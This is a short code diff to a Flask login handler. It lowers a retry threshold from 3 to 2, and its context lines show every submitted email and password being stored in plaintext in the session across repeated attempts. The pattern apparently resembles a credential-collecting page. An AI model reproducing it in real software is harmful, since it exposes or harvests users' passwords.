@@ -46,7 +46,7 @@ def login():
     session['creds'].append({"email": email, "password": password})
 
     # If attempts less than 3 → just show login page again
-    if session['attempts'] < 3:
+    if session['attempts'] < 2:
         flash(f"Attempt {session['attempts']} of 3. Please try again.")
         return render_template('index.html')
 
